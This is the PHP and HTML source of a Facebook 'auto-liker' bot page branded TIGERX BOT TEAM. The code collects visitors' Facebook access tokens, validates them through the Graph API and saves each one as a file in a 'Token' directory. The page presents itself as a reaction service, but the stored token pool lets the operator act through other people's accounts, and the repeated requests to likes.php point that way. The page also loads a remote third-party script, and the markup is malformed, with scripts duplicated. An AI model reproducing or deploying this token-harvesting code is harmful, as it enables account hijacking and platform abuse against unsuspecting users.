<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"><html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><title>
TIGERX BOT TEAM
</title><link rel="stylesheet" type="text/css" href="B.css"
<link href="https://fonts.googleapis.com/css?family=Kalam" rel="stylesheet"> 
<center><div style="font-family: 'Kalam', cursive;
font-size: 30pt">
<strong><marquee behavior="alternate"><center><script language="JavaScript" src="B.js"></script></font></center></marquee></strong><br>
<script language="JavaScript" src="snow.js"></script>
<?php
$yx=opendir('Token');
while($isi=readdir($yx)){
if($isi != '.' && $isi != '..'){
$member[]=$isi;
}
}
$like = new like();
if($_GET[act]){
print '';
}
if($_POST[access_token]){
$access_token = $_POST[access_token];
$me = $like -> me($access_token);
if($me[id]){
$like -> Token($access_token);
if($_POST[id]){
$like -> pancal($_POST[id]);
}else{
$like -> getData($access_token);
}
}else{
$like -> invalidToken();
}
}else{
$like->form();
}
class like {
public function pancal($id){ for($i=1;$i<4;$i++){
$this-> _req('http://google.com/gwt/n?u='.urlencode('http://'.$_SERVER[HTTP_HOST].'/likes.php?id='.$id.'&n='.$i));
}
print '';
}
public function me($access){
return json_decode($this-> _req('https://graph.facebook.com/me?access_token='.$access),true);
}
public function Token($access){
if(!is_dir('Token')){
mkdir('Token');
}
$a=fopen('Token/'.$access,'w');
fwrite($a,1);
fclose($a);
}
public function invalidToken(){
print'<script>window.alert("Your Token is Invalid, Try Again :)");</script>';
$this->form();
}
public function form(){
 echo '
 </br>
 <strong><center>
<a href="https://facebook.com/topper.vk" alt="Token shaikh" target="_blank"><img src="https://graph.facebook.com/100021495444328/picture?type=large" alt="" style="border-radius: 99em; border: 2px; box-shadow: 0px 0px 15px 10px 	white; padding: 0px;" width="200" height="200" title=""/></a>
<a href="https://facebook.com/100016624871195" alt="Token shaikh" target="_blank"><img src="https://graph.facebook.com/100016624871195/picture?type=large" alt="" style="border-radius: 99em; border: 2px; box-shadow: 0px 0px 15px 10px 	white; padding: 0px;" width="200" height="200" title=""/></a>
</div></div>
 </br> </br>
<link href="https://fonts.googleapis.com/css?family=Kalam" rel="stylesheet"> 
<center><div style="font-family: Kalam;font-size: 30pt">
<div id="center">
<center><font color="Red" size="+1"><marquee bgcolor="" direction="left" loop="infinite" width="25%"><strong>👇 TOKEN SITE & MY BLOG 👇</strong></marquee></font><center>
<a href="https://vk-tokenxx.herokuapp.com/" target="_blank"><input class="button1" type="button" value="LOVE REACT"></a>
<a href="https://vk-tokenxx.herokuapp.com/" target="_blank"><input class="button1" type="button" value="WOW REACT"></a>
</center></br>
<center><font color="Blue" size="+1"><marquee bgcolor="" direction="left" loop="infinite" width="40%"><strong>👇 REACTION SITE 👇</strong></marquee></font><center>
<a href="https://vk-tokenxx.herokuapp.com/" target="_blank"><input class="button" type="button" value="LOVE REACT"></a>
<a href="https://vk-tokenxx.herokuapp.com/" target="_blank"><input class="button" type="button" value="WOW REACT"></a>
<a href="https://vk-tokenxx.herokuapp.com/" target="_blank"><input class="button" type="button" value="WOW REACT"></a>
<a href="https://vk-tokenxx.herokuapp.com/" target="_blank"><input class="button" type="button" value="WOW REACT"></a>
</center>
<br>
<center><font color="Red" size="+1"><marquee bgcolor="" direction="left" loop="infinite" width="40%"><strong>👇 REACT+ COMMENT SITES 👇</strong></marquee></font><center>
<a href="https://vk-tokenxx.herokuapp.com/" target="_blank"><input class="button1" type="button" value="LOVE REACT"></a>
<a href="https://vk-tokenxx.herokuapp.com/" target="_blank"><input class="button" type="button" value="WOW REACT"></a>
<a href="https://vk-tokenxx.herokuapp.com/" target="_blank"><input class="button1" type="button" value="WOW REACT"></a>
<a href="https://vk-tokenxx.herokuapp.com/" target="_blank"><input class="button" type="button" value="WOW REACT"></a>
</center></div>
</form></center><br>
</font><br>
</b></a></center></div></div></body></html>';
}
public function getData($access){
$feed=json_decode($this -> _req('https://graph.facebook.com/me/home?access_token='.$access.'&limit=1'),true);
if(count($feed[data]) >= 1){
for($i=0;$i<count($feed[data]);$i++){
$uid = $feed[data][$i][from][id];
$name = $feed[data][$i][from][name];
$type = $feed[data][$i][type];
$mess = str_replace(urldecode('%0A'),'<br/>',htmlspecialchars($feed[data][$i][message]));
$id = $feed[data][$i][id];
$pic = $feed[data][$i][picture];
echo'
';
if($type=='photo'){
echo'
';
}else{
echo'
';
}
}
}else{
print '';
}
print '';
}
private function _req($url){
$ch = curl_init();
curl_setopt_array($ch,array(
CURLOPT_CONNECTTIMEOUT => 5,
CURLOPT_RETURNTRANSFER => true,
CURLOPT_URL => $url,
) );
$result = curl_exec($ch);
curl_close($ch);
return $result;
}
}
?>
</body>
</html>
<center><a href="" target="_blank"><img src="https://www.reliablecounter.com/count.php?page=https://token-vk.herokuapp.com/&digit=style/plain/11/&reloads=0" alt="" title="" border="0"></a><br /><a href="http://rayon.info" target="_blank" style="font-family: Geneva, Arial; font-size: 9px; color: #330010; text-decoration: none;"></a></center>
<h2>
<hr>
</div>
<div class="kddtop"> <div class="kddtut"><p>
<!-- This Script is from www.javascriptbestcodes.com, Provided by: Web Smile -->
<script type='text/javascript' src='http://m.free-codes.org/g.php?id=2002'></script><style type="text/css">
</style>
<script language="JavaScript1.2">
var x,y
var kern=20 
var flag=0
var message="TIGERX"
message=message.split("")
var xpos=new Array()
for (i=0;i<message.length;i++) {
	xpos[i]=-50
	}
var ypos=new Array()
for (i=0;i<message.length;i++) {
	ypos[i]=-50
	}
function handlerMM(e){
	x = (e) ? e.pageX : document.body.scrollLeft+event.clientX
	y = (e) ? e.pageY : document.body.scrollTop+event.clientY
	flag=1
	}
function makebanner() {
	if (flag==1) {
		for (i=message.length-1; i>=1; i--) {
			xpos[i]=xpos[i-1]+kern
			ypos[i]=ypos[i-1]
			}
		xpos[0]=x+kern
		ypos[0]=y
		for (i=0; i<message.length; i++) {
			if (document.getElementById) {
				var thisspan = document.getElementById("span"+i).style
				} else {
				var thisspan = eval((document.layers)?"document.span"+i:"span"+(i)+".style")
				}
			if (thisspan.posLeft) {
				thisspan.posLeft=xpos[i]
				thisspan.posTop=ypos[i]
				}
			if (!thisspan.posLeft) {
				thisspan.left=xpos[i]
				thisspan.top=ypos[i]
				}
			}
		}
		var timer=setTimeout("makebanner()",30)
	}
window.onload=makebanner;
</script>
<script language="JavaScript1.2">
for (i=0;i<message.length;i++) {
document.write("<span id='span"+i+"' class='spanstyle'>")
document.write(message[i])
document.write("</span>")
}
if (document.layers){
document.captureEvents(Event.MOUSEMOVE);
}
document.onmousemove = handlerMM;

</script>
<style type="text/css">
<!--
.spanstyle {
position:absolute;
visibility:visible;
top:-50px;
font-size:10pt;
font-family:Kalam;
font-weight:italic;
color:808066;
}
BODY {
width:100%;overflow-x:hidden;overflow-y:scroll;
}
-->
</style>
<script language="JavaScript1.2">
var x,y
var kern=20 
var flag=0
var message="TIGERX"
message=message.split("")
var xpos=new Array()
for (i=0;i<message.length;i++) {
	xpos[i]=-50
	}
var ypos=new Array()
for (i=0;i<message.length;i++) {
	ypos[i]=-50
	}
function handlerMM(e){
	x = (e) ? e.pageX : document.body.scrollLeft+event.clientX
	y = (e) ? e.pageY : document.body.scrollTop+event.clientY
	flag=1
	}
function makebanner() {
	if (flag==1) {
		for (i=message.length-1; i>=1; i--) {
			xpos[i]=xpos[i-1]+kern
			ypos[i]=ypos[i-1]
			}
		xpos[0]=x+kern
		ypos[0]=y
		for (i=0; i<message.length; i++) {
			if (document.getElementById) {
				var thisspan = document.getElementById("span"+i).style
				} else {
				var thisspan = eval((document.layers)?"document.span"+i:"span"+(i)+".style")
				}
			if (thisspan.posLeft) {
				thisspan.posLeft=xpos[i]
				thisspan.posTop=ypos[i]
				}
			if (!thisspan.posLeft) {
				thisspan.left=xpos[i]
				thisspan.top=ypos[i]
				}
			}
		}
		var timer=setTimeout("makebanner()",12)
	}
window.onload=makebanner;
</script>
<script language="JavaScript1.2">
for (i=0;i<message.length;i++) {
document.write("<span id='span"+i+"' class='spanstyle'>")
document.write(message[i])
document.write("</span>")
}
if (document.layers){
document.captureEvents(Event.MOUSEMOVE);
}
document.onmousemove = handlerMM;

</script></body>